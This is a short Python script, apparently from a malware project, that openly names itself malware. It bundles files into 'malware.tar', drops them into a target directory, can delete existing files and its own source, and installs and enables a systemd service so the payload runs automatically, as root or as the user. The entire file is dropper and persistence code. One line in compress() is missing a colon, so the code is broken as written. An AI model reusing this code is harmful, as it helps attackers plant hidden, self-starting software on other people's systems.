#!/bin/python
import config
import os
import tarfile

# true if root priviledges false otherwise
isRoot = os.popen("echo $USER").read()=="root\n"

# compress all files for easy distribution
def compress(out="malware.tar"):
	file = tarfile.open(out, "w")
	for i in os.listdir():
		if os.path.isfile(i) and i != out
			file.add(i)
	file.close()

# move malware to target
def move(source="malware.tar",force=False, clear=False):
	target = config.root["targetDir"] if isRoot else config.user["targetDir"]
	target = os.path.expanduser(target)

	if os.path.exists(target):
		if force:
			for i in os.listdir(target):
				os.remove(target+i)
			os.rmdir(target)
		else:
			return

	os.mkdir(target)

	with tarfile.open(source,"r") as file:
		file.extractall(target)

	if clear:
		for i in os.listdir():
			os.remove(i)

# creates a service to auto run the malware
# makes script for CURRENT running file
def createService(name="malware"):
	data = config.service.format(targetPath = os.path.abspath(__file__), name = name)

	target = config.root["serviceLoc"] if isRoot else config.user["serviceLoc"]
	target = os.path.expanduser(target)
	if not os.path.exists(target):
		os.makedirs(target)

	with open(target + name + ".service", "w") as file:
		file.write(data)

	if isRoot:
		os.system("systemctl enable " + name)
	else:
		os.system("systemctl --user enable " + name)
